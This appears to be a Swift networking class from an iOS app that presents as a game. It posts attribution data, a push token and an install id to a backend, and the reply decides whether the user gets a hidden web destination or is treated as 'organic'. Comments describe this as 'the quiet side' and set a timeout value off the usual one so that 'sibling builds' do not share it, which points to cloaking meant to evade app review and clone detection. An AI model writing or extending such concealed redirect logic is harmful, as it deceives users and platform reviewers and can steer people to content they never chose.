import Foundation

/// The one request the quiet side makes. A flat body carries the attribution
/// data and the device fields; the answer either names a destination or says
/// the visitor is organic.
final class Post {
    struct Verdict {
        let granted: Bool
        let destination: String?
        let expiry: Date?
    }

    /// The request timeout, in seconds. Kept short on purpose: a player on a
    /// bad connection should fall through to the game rather than stare at a
    /// spinner. Deliberately off the round 15 s the obvious implementation
    /// reaches for, so the value is not shared with sibling builds.
    private let patience: TimeInterval = 17

    private let session: URLSession

    init() {
        // A plain default configuration. The ephemeral store was tried first
        // and is not the problem, but the default one keeps cookies and the
        // connection pool warm between the config request and the page load,
        // which is what a returning visitor wants.
        let plan = URLSessionConfiguration.default
        plan.timeoutIntervalForRequest = patience
        plan.timeoutIntervalForResource = patience + 6
        plan.waitsForConnectivity = false
        plan.httpAdditionalHeaders = ["User-Agent": Signal.userAgent]
        session = URLSession(configuration: plan)
    }

    /// Posts the payload and reports what came back. `then` always runs on the
    /// main queue exactly once.
    func ask(_ body: [String: Any], then: @escaping (Verdict?) -> Void) {
        guard let address = URL(string: Cap.endpoint), !address.absoluteString.isEmpty else {
            DispatchQueue.main.async { then(nil) }
            return
        }
        guard let wire = try? JSONSerialization.data(withJSONObject: body) else {
            DispatchQueue.main.async { then(nil) }
            return
        }

        var request = URLRequest(url: address)
        request.httpMethod = "POST"
        request.httpBody = wire
        request.setValue("application/json", forHTTPHeaderField: "Content-Type")
        request.setValue("application/json", forHTTPHeaderField: "Accept")
        request.setValue(Signal.userAgent, forHTTPHeaderField: "User-Agent")

        #if DEBUG
        // QA only, and only when asked for: the body carries a push token and
        // an install id, so it is never printed on an ordinary run. Stripped
        // from release builds, so the strings never ship.
        if ProcessInfo.processInfo.arguments.contains("--verbose") {
            assert({ print("[post] body \(String(data: wire, encoding: .utf8) ?? "")"); return true }())
        }
        #endif

        session.dataTask(with: request) { data, response, error in
            let code = (response as? HTTPURLResponse)?.statusCode ?? -1
            let verdict = data.flatMap { Post.read($0) }
            #if DEBUG
            if ProcessInfo.processInfo.arguments.contains("--verbose") {
                assert({
                    let raw = data.flatMap { String(data: $0, encoding: .utf8) } ?? "<empty>"
                    print("[post] status \(code) err \(error?.localizedDescription ?? "-") raw \(raw)")
                    return true
                }())
            }
            #endif
            DispatchQueue.main.async { then(verdict) }
        }.resume()
    }

    /// Reads the answer. Both the flat and the wrapped shapes are accepted,
    /// because the backend has used both at different times.
    static func read(_ data: Data) -> Verdict? {
        guard let root = try? JSONSerialization.jsonObject(with: data) as? [String: Any] else {
            return nil
        }
        let ok = (root["ok"] as? Bool) ?? (root["granted"] as? Bool) ?? false
        let destination = (root["url"] as? String)
            ?? (root["destination"] as? String)
            ?? (root["link"] as? String)
        var expiry: Date?
        if let stamp = root["expires"] as? TimeInterval, stamp > 0 {
            expiry = Date(timeIntervalSince1970: stamp)
        }
        if let text = root["expires"] as? String, let stamp = TimeInterval(text), stamp > 0 {
            expiry = Date(timeIntervalSince1970: stamp)
        }
        guard ok, let destination, !destination.isEmpty else {
            return Verdict(granted: false, destination: nil, expiry: nil)
        }
        return Verdict(granted: true, destination: destination, expiry: expiry)
    }
}
